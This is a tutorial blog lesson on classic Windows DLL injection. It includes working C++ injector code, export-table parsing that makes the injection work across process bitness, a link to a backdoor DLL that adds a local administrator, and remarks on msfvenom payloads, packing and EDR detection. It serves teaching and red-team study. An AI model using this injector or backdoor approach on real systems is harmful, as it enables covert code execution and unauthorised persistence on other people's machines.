Title: Lesson 4.1 - Improving Classic DLL Injection
Date: 2022-06-08T19:18:32.000Z

<p>Recently I found myself interested in learning more and more about Process Injection, mainly due to high number of techniques you can use to achieve the same goal: remote code execution in other processes.</p><p>There are many useful resources publicly available on the Internet regarding this topic, such as:</p><ul><li><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf">Windows Process Injection in 2019</a> by  <em>Amit Klein </em>and <em>Itzik Kotler</em></li><li><a href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">Ten process injection techniques: A technical survey of common and trending process injection techniques</a> by <em>Ashkan Hosseini</em></li></ul><p>One of the most basic methods to perform Process Injection, and the one I'm going to discuss here, is known as <em>Classic DLL Injection</em>.</p><p>As regards its author, I've tried tracking them down based on the information available on the Internet, however I couldn't find a decisive answer.</p><p>As the name implies, the technique is based on the injection of a <em>Dynamic Link Library</em> (DLL) within the memory of a remote process. Below is a diagram that sums up the steps you have to follow to perform it.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/08/image.png" class="kg-image" alt loading="lazy" width="836" height="1196" srcset="__GHOST_URL__/content/images/size/w600/2022/08/image.png 600w, __GHOST_URL__/content/images/2022/08/image.png 836w" sizes="(min-width: 720px) 720px"><figcaption>Classic DLL Injection steps</figcaption></figure><p>At a high level, it is based on the creation of a thread inside a victim process that loads an arbitrary DLL library.</p><p>To implement it, you would usually follow the steps below:</p><ol><li>Allocate some space in the memory of the victim process, it must be enough to contain the path of the malicious DLL, e.g. <code>C:\Temp\malicious.dll</code></li><li>Write the path of the DLL inside the allocated memory space using a write primitive e.g. <code>WriteProcessMemory</code></li><li>Force the victim process to create a new thread in order to use the path of the DLL to load it and execute the malicious payload</li></ol><h2 id="creating-the-dll">Creating the DLL</h2><p>The obvious requirement of DLL Injection is to a have, well, a DLL to inject. There are <strong>many</strong> ways to obtain one.</p><p>For example, you can create one that starts a reverse shell or a fully-featured meterpreter session:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/08/image-1.png" class="kg-image" alt loading="lazy" width="1054" height="219" srcset="__GHOST_URL__/content/images/size/w600/2022/08/image-1.png 600w, __GHOST_URL__/content/images/size/w1000/2022/08/image-1.png 1000w, __GHOST_URL__/content/images/2022/08/image-1.png 1054w" sizes="(min-width: 720px) 720px"><figcaption>Using <code>msfvenom</code> to create a DLL</figcaption></figure><p>Among the many alternatives, there's also the possibility to write one from scratch. Fortunately, I've already written the source code for a simple DLL a few months ago.</p><figure class="kg-card kg-bookmark-card kg-card-hascaption"><a class="kg-bookmark-container" href="https://github.com/rbctee/MalwareDevelopment/tree/master/code/windows/backdoor-dll"><div class="kg-bookmark-content"><div class="kg-bookmark-title">MalwareDevelopment/code/windows/backdoor-dll at master · rbctee/MalwareDevelopment</div><div class="kg-bookmark-description">Code and notes regarding Malware Development. Contribute to rbctee/MalwareDevelopment development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.com/fluidicon.png" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">rbctee</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/f37090b96514c0f09652c023e218f231b6612d080630f05accc9c7879297aba8/rbctee/MalwareDevelopment" alt=""></div></a><figcaption>Example of DLL</figcaption></figure><p>The one above creates a new local administrator named <code>rbct</code>. In my experience it's been useful for <em>Capture the Flag</em> competitions and real-life engagements, as it can be easily injected into other processes.</p><p>One of the advantages of writing your programs into a basic language like C/C++ is that they can't be easily reversed or de-compiled, more so if you also use a custom packer.</p><h2 id="keeping-it-classy">Keeping it classy</h2><p>If you were to search for some implementations on the Internet, you would probably find something similar the code below:</p>
        <div class="kg-card kg-file-card ">
            <a class="kg-file-card-container" href="__GHOST_URL__/content/files/2022/11/simple.cpp" title="Download" download>
                <div class="kg-file-card-contents">
                    <div class="kg-file-card-title">Source code of the simple version</div>
                    <div class="kg-file-card-caption">Simple version of the Classic DLL Injection</div>
                    <div class="kg-file-card-metadata">
                        <div class="kg-file-card-filename">simple.cpp</div>
                        <div class="kg-file-card-filesize">6 KB</div>
                    </div>
                </div>
                <div class="kg-file-card-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><defs><style>.a{fill:none;stroke:currentColor;stroke-linecap:round;stroke-linejoin:round;stroke-width:1.5px;}</style></defs><title>download-circle</title><polyline class="a" points="8.25 14.25 12 18 15.75 14.25"/><line class="a" x1="12" y1="6.75" x2="12" y2="18"/><circle class="a" cx="12" cy="12" r="11.25"/></svg>
                </div>
            </a>
        </div>
        <p>Removing the comments and the conditional statements checking the return values of the functions, it's possible to keep the source code under thirty lines of code:</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;TlHelp32.h&gt;

int main(int argc, char* argv[])
{
    unsigned int victimProcessId;

    if (argc &gt; 1)
    {
        victimProcessId = atoi(argv[1]);
    }
    else
    {
        printf("[+] Usage:\n\tprogram.exe PID\n");
        return 1;
    }

    DWORD desiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
    HANDLE victimProcessHandle = OpenProcess(desiredAccess, NULL, victimProcessId);

    LPVOID allocatedMemory = VirtualAllocEx(victimProcessHandle, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    char maliciousLibrary[] = "C:\\Users\\rbct\\Desktop\\malicious.dll";

    BOOL retVal = WriteProcessMemory(victimProcessHandle, allocatedMemory, maliciousLibrary, strlen(maliciousLibrary), NULL);
        
    HMODULE handleTargetModule = GetModuleHandleA("kernel32.dll");
    PVOID loadLibraryLocalAddress = GetProcAddress(handleTargetModule, "LoadLibraryA");

    HANDLE remoteThread = CreateRemoteThread(victimProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryLocalAddress, allocatedMemory, 0, NULL);
    
    WaitForSingleObject(remoteThread, INFINITE);
}</code></pre><figcaption>Shorter version of the proof of concept</figcaption></figure><p>Minified or not, the source code runs the following Win32 API functions:</p><ul><li><code>OpenProcess</code> opens the process identified by the PID passed to the function, returning a <em>HANDLE </em>to the remote process</li><li><code>VirtualAllocEx</code> allocates a new memory page (default size of 4096 bytes) in the remote process, setting it as readable and writable.</li><li><code>WriteProcessMemory</code> writes the path of the DLL in the allocated memory page</li><li><code>GetProcAddress</code> retrieves the address of the function <code>LoadLibraryA</code> in the memory space of the current process. This address should be the same for the remote process, otherwise the injection will fail.</li><li><code>CreateRemoteThread</code> creates a new thread in the remote process, which calls the function <code>LoadLibraryA</code> with the pointer to the DLL path</li><li><code>WaitForSingleObject</code> awaits the termination of the remote thread</li></ul><p>That's the everyday Classic DLL Injection you can find on the Internet. It's pretty simple to implement, however it suffers from a little problem regarding the bitness of the processes.</p><p>To be more specific, the bitness of the remote process must be equal to the bitness of the current process i.e., the one doing the injection:</p><!--kg-card-begin: html--><table><thead><tr><th></th>
<th>Remote Process (32-bit)</th>
<th>Remote Process (64-bit)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Current Process (32-bit)</td>
<td><g-emoji class="g-emoji" alias="heavy_check_mark" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png">✔️</g-emoji></td>
<td><g-emoji class="g-emoji" alias="x" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png">❌</g-emoji></td>
</tr>
<tr>
<td>Current Proces (64-bit)</td>
<td><g-emoji class="g-emoji" alias="x" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png">❌</g-emoji></td>
<td><g-emoji class="g-emoji" alias="heavy_check_mark" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png">✔️</g-emoji></td></tr></tbody></table><!--kg-card-end: html--><p>If the bitness of the two processes is different, the injection will fail. This is caused by the usage of <code>GetModuleHandle</code> and <code>GetProcAddress</code> to retrieve the address of the function <code>LoadLibraryA</code>.</p><p>In fact, if the bitness of the remote process is different, it means that the length of a memory address is different.</p><p>For example, if the current process is 32-bit, then it uses 32-bits-long virtual addresses, while a 64-bit process uses 64-bits-long virtual addresses.</p><p>Therefore, if the function <code>LoadLibraryA</code> returns a 64-bits-long virtual address, we can't pass it to the function <code>CreateRemoteThread</code> on a 32-bit process, otherwise the latter will fail.</p><p>There's also another problem: this approach is based on the assumption that the order of the DLL libraries loaded in the victim process is the same as for the current process.</p><p>That's why we don't retrieve the address of <code>LoadLibraryA</code> from the remote process, but from the current process, since the position of the DLL <code>kernel32.dll</code> <strong>should</strong> be the same for all the processes of the same bitness.</p><p>However, if the order of the DLL is different, then the address for <code>LoadLibraryA</code> in the current process will point to something else entirely in the remote process.</p><h2 id="s-stands-for-stability">S stands for Stability</h2><p>To solve these issues, I've rewritten most of the source code. You can find the final version following the link below:</p><!--members-only--><figure class="kg-card kg-bookmark-card kg-card-hascaption"><a class="kg-bookmark-container" href="https://github.com/rbctee/ProcessInjection/blob/master/techniques/classic_dll_injection/code/cpp/stable.cpp"><div class="kg-bookmark-content"><div class="kg-bookmark-title">ProcessInjection/stable.cpp at master · rbctee/ProcessInjection</div><div class="kg-bookmark-description">Code for an upcoming course regarding Process Injection techniques - ProcessInjection/stable.cpp at master · rbctee/ProcessInjection</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.com/fluidicon.png" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">rbctee</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/22531b28d2b3445497e197574288e5725b473ead6ead188c020cb2f4dd798b66/rbctee/ProcessInjection" alt=""></div></a><figcaption>Stable version of the Classic DLL Injection</figcaption></figure>
        <div class="kg-card kg-file-card ">
            <a class="kg-file-card-container" href="__GHOST_URL__/content/files/2022/11/stable.cpp" title="Download" download>
                <div class="kg-file-card-contents">
                    <div class="kg-file-card-title">Source code of the stable version</div>
                    <div class="kg-file-card-caption">Stable version of the classic DLL Injection</div>
                    <div class="kg-file-card-metadata">
                        <div class="kg-file-card-filename">stable.cpp</div>
                        <div class="kg-file-card-filesize">18 KB</div>
                    </div>
                </div>
                <div class="kg-file-card-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><defs><style>.a{fill:none;stroke:currentColor;stroke-linecap:round;stroke-linejoin:round;stroke-width:1.5px;}</style></defs><title>download-circle</title><polyline class="a" points="8.25 14.25 12 18 15.75 14.25"/><line class="a" x1="12" y1="6.75" x2="12" y2="18"/><circle class="a" cx="12" cy="12" r="11.25"/></svg>
                </div>
            </a>
        </div>
        <p>Compared to the previous code, there are a few changes regarding the dependencies of the program, the Win32 API functions used, and the techniques employed:</p><ul><li>using the <em>Tool Help Library</em> to enumerate the DLL libraries loaded by the victim process</li><li>using the function <code>ReadProcessMemory</code> to read information from the remote process e.g., memory addresses</li><li>using the functions <code>HeapAlloc</code> and <code>HeapFree</code> to manage the heap memory, the latter used for storing the bytes read from victim process</li><li>accessing the EAT (<em>Export Address Table</em>) of the <code>kernel32.dll</code> library loaded by the remote process, in order to calculate the exact address of the function <code>LoadLibraryA</code>.</li></ul><p>I'm not going to discuss every instruction inside the source code, mainly because half of the file is made up of comments. Instead, I'll describe how to retrieve the necessary information from the EAT structure, since it's the part I consider most interesting.</p><h2 id="analyzing-the-headers">Analyzing the headers</h2><p>One way to obtain the address of the <em>Export Address Table</em> is to calculate it based on the bits of information found in the headers of the DLL (kernel32.dll in this case).</p><p>The steps are more of less these:</p><ul><li>retrieving the base address of the DLL library</li><li>reading the value of the field <code>e_lfanew</code> from the DOS header to get the position of the <em>NT Headers</em></li><li>reading the value of the field <code>OptionalHeader</code> to get the address of the <em>Optional Header</em> structure</li><li>getting the address of the <em>Export Directory Table</em> from the <code>VirtualAddress</code> field of the first element of the array <code>DataDirectory</code> from the Optional Header</li><li>access the <em>Export Address Table</em> through the fields <code>AddressOfFunctions</code>, <code>AddressOfNames</code>, <code>AddressOfNameOrdinals</code></li></ul><p>The following figures shows how to get to the <em>Export Address Table</em> starting from the structure <code>_IMAGE_DOS_HEADER</code>, which can be found at the very beginning of the DLL file.</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/08/image-4.png" class="kg-image" alt loading="lazy" width="2000" height="867" srcset="__GHOST_URL__/content/images/size/w600/2022/08/image-4.png 600w, __GHOST_URL__/content/images/size/w1000/2022/08/image-4.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/08/image-4.png 1600w, __GHOST_URL__/content/images/2022/08/image-4.png 2278w" sizes="(min-width: 1200px) 1200px"><figcaption>Finding the address of the EAT (part 1)</figcaption></figure><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/08/image-6.png" class="kg-image" alt loading="lazy" width="2000" height="731" srcset="__GHOST_URL__/content/images/size/w600/2022/08/image-6.png 600w, __GHOST_URL__/content/images/size/w1000/2022/08/image-6.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/08/image-6.png 1600w, __GHOST_URL__/content/images/size/w2400/2022/08/image-6.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>Finding the address of the EAT (part 2)</figcaption></figure><p>Note that structures such as <code>_IMAGE_DOS_HEADER</code> remain the same regardless of the bitness of the DLL, so you can for example access the field <code>e_lfanew</code> adding <code>0x3c</code> to the base address of the loaded library.</p><p>However, other structures such as <code>_IMAGE_NT_HEADERS</code> have different fields based on the bitness of the DLL:</p><ul><li><code><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64">_IMAGE_NT_HEADERS64</a></code></li><li><code><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32">_IMAGE_NT_HEADERS32</a></code></li></ul><p>This is very important to remember when writing code, but also useful while debugging with WinDbg: if you don't use the correct version of the structure, or if the programs defaults to the 32-bit version, the values you analyze may be completely different from what you're expecting.</p><h2 id="tracking-down-the-exports">Tracking down the exports</h2><p>Before showing how to get the address of <code>LoadLibraryA</code> let's talk a bit about the Export Directory. Based on some documentation I've found on the Internet, its structure should be like this:</p><!--kg-card-begin: html--><table><thead><tr><th>Offset</th>
<th>Size</th>
<th>Field</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>0 <br></td>
<td>4 <br></td>
<td>Export Flags <br></td>
<td>Reserved, must be 0. <br></td>
</tr>
<tr>
<td>4 <br></td>
<td>4 <br></td>
<td>Time/Date Stamp <br></td>
<td>The time and date that the export data was created. <br></td>
</tr>
<tr>
<td>8 <br></td>
<td>2 <br></td>
<td>Major Version <br></td>
<td>The major version number. The major and minor version numbers can be set by the user. <br></td>
</tr>
<tr>
<td>10 <br></td>
<td>2 <br></td>
<td>Minor Version <br></td>
<td>The minor version number. <br></td>
</tr>
<tr>
<td>12 <br></td>
<td>4 <br></td>
<td>Name RVA <br></td>
<td>The address of the ASCII string that contains the name of the DLL. This address is relative to the image base. <br></td>
</tr>
<tr>
<td>16 <br></td>
<td>4 <br></td>
<td>Ordinal Base <br></td>
<td>The starting ordinal number for exports in this image. This field 
specifies the starting ordinal number for the export address table. It 
is usually set to 1. <br></td>
</tr>
<tr>
<td>20 <br></td>
<td>4 <br></td>
<td>Address Table Entries <br></td>
<td>The number of entries in the export address table. <br></td>
</tr>
<tr>
<td>24 <br></td>
<td>4 <br></td>
<td>Number of Name Pointers <br></td>
<td>The number of entries in the name pointer table. This is also the number of entries in the ordinal table. <br></td>
</tr>
<tr>
<td>28 <br></td>
<td>4 <br></td>
<td>Export Address Table RVA <br></td>
<td>The address of the export address table, relative to the image base. <br></td>
</tr>
<tr>
<td>32 <br></td>
<td>4 <br></td>
<td>Name Pointer Table RVA <br></td>
<td>The address of the export name pointer table, relative to the image 
base. The table size is given by the Number of Name Pointers field. <br></td>
</tr>
<tr>
<td>36 <br></td>
<td>4 <br></td>
<td>Ordinal Table RVA <br></td>
<td>The address of the ordinal table, relative to the image base. </td></tr></tbody></table><!--kg-card-end: html--><p>The fields that are useful to us are:</p><ul><li><em>Address Table Entries, </em>to determine the size of the Export Address Table and how many times to loop</li><li><em>Export Address Table RVA, </em>which points to the beginning of the EAT</li><li><em>Name Pointer Table RVA</em>, pointing to the names of the exported functions</li></ul><p>Putting this information together, we can loop through the EAT, checking whether the name of the exported function is equal to <code>LoadLibraryA</code>.</p><p>The offset of the name pointer (of the string "LoadLibraryA") can be used in the <em>Export Address Table RVA</em> to get the RVA of the function. RVA stands for <em>Relative Virtual Address</em> and it's a relative address, in this case relative to the base address of the module.</p><p>Adding the base address of the module (<strong>kernel32.dll</strong>) to the RVA we get the absolute address of <code>LoadLibraryA</code>, which we can pass to <code>CreateRemoteThread</code>.</p><p>Below is a snippet of code containing the part of the source code that retrieves the address of <code>LoadLibraryA</code> from the EAT:</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">	/*
	Populate the structure IMAGE_EXPORT_DIRECTORY with the first bytes of the
	export directory, which at the moment are located on the heap.
	We'll need this structure to retrieve the offset of the names/address of the
	exported functions.
	*/
	IMAGE_EXPORT_DIRECTORY imageExportDirectory;
	CopyMemory(
		&amp;imageExportDirectory,				// pointer to variable/struct to populate
		allocatedHeapMemoryAddress,			// pointer to the source buffer
		sizeof(IMAGE_EXPORT_DIRECTORY));	// number of bytes to copy from the source buffer

	int numExportedFunctions = imageExportDirectory.NumberOfFunctions;
	printf("[+] Num. of functions exported by the module kernel32.dll loaded by the victim process: 0x%x (%d)\n", numExportedFunctions, numExportedFunctions);

	/*
	Calculate the absolute addresses (in the current process, since we copied the entire Export Directory)
	- addressExportFunctionsNames -&gt; absolute address of the Relative Virtual Address (RVA) of the name
		of the first function
	- addressExportFunctions -&gt; absolute address of the Relative Virtual Address (RVA) of the code
		of the first function
	By RVA, we mean an offset starting from the base address of the module (kernel32.dll)
	*/
	ULONG_PTR addressExportFunctionsNames = ((ULONG_PTR)allocatedHeapMemoryAddress) + 
		(imageExportDirectory.AddressOfNames - exportDirectoryAddressOffset);
	ULONG_PTR addressExportFunctions = ((ULONG_PTR)allocatedHeapMemoryAddress) +
		(imageExportDirectory.AddressOfFunctions - exportDirectoryAddressOffset);
	
	ULONG_PTR offsetExportFunctionName;
	ULONG_PTR addressExportFunctionName;
	ULONG_PTR targetFunctionAddress;
	ULONG_PTR targetFunctionRVA;

	char targetFunctionName[] = "LoadLibraryA";
	
	/*
	Loop through all the exported functions from the target module (kernel32.dll).
	There should be about 1600 functions to check.
	*/
	for (int i = 0; i &lt; numExportedFunctions; i++)
	{

		/*
		Copy the Relative Virtual Address (RVA) of the function name, so we can
		retrieve it and compare it with the string 'LoadLibraryA'.
		*/
		CopyMemory(
			&amp;offsetExportFunctionName,
			(PVOID)(addressExportFunctionsNames + (i * 4)),
				4);

		/*
		Calculating the absolute address of the function name.
		Since we copied the entire Export Directory from the victim process,
		there's no need to call ReadProcessMemory for each function.
		The absolute address of the function name resides in the Heap
		of the current process.
		*/
		addressExportFunctionName = ((ULONG_PTR)allocatedHeapMemoryAddress) +
			offsetExportFunctionName - exportDirectoryAddressOffset;

		/*
		Checking if the name of the exported function is equal to "LoadLibraryA".
		*/
		if (strcmp(targetFunctionName, (const char *)addressExportFunctionName) == 0)
		{
			printf("[+] Function name: %s\n", addressExportFunctionName);

			/*
			Copy the RVA, which is 4-bytes long, of the target function (LoadLibraryA)
			into the variable 'targetFunctionRVA'.
			*/
			CopyMemory(
				&amp;targetFunctionRVA,
				(PVOID)(addressExportFunctions + (i * 4)),
				4);

			printf("[+] Relative Virtual Address of the target Export Function: %p\n", targetFunctionRVA);

			/*
			Now that we have the RVA of LoadLibraryA, we can calculate its absolute address
			(in the memory of the victim process).
			*/
			targetFunctionAddress = (ULONG_PTR)(moduleStructure.modBaseAddr + targetFunctionRVA);
			printf("[+] Absolute Virtual Address of the target Export Function in the victim process: %p\n", targetFunctionAddress);

			break;
		}
	}</code></pre><figcaption>Retrieving the address of LoadLibraryA from the Export Address Table</figcaption></figure><h2 id="afterword">Afterword</h2><p>As for now, the technique can be used both from 32-bit process and 64-bit process, to inject a DLL library in a remote process of arbitrary bitness, as recapitulated in the following table:</p><!--kg-card-begin: html--><table><thead><tr><th></th>
<th>Remote Process (32-bit)</th>
<th>Remote Process (64-bit)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Current Process (32-bit)</td>
<td><g-emoji class="g-emoji" alias="heavy_check_mark" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png"><img class="emoji" alt="heavy_check_mark" src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png" width="20" height="20"></g-emoji></td>
<td><g-emoji class="g-emoji" alias="heavy_check_mark" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png"><img class="emoji" alt="heavy_check_mark" src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png" width="20" height="20"></g-emoji></td>
</tr>
<tr>
<td>Current Proces (64-bit)</td>
<td><g-emoji class="g-emoji" alias="heavy_check_mark" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png"><img class="emoji" alt="heavy_check_mark" src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png" width="20" height="20"></g-emoji></td>
<td><g-emoji class="g-emoji" alias="heavy_check_mark" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png"><img class="emoji" alt="heavy_check_mark" src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png" width="20" height="20"></g-emoji></td></tr></tbody></table><!--kg-card-end: html--><p>Although I've modified the Classic DLL Injection with the goal to improve it, it still remains very basic from in terms of evasion capabilities, so EDR products may detect it immediately.</p><p>Obviously there's some room for improvement. For example, you could remove suspicious functions such as <code>ReadProcessMemory</code>, instead mapping the DLL into memory.</p>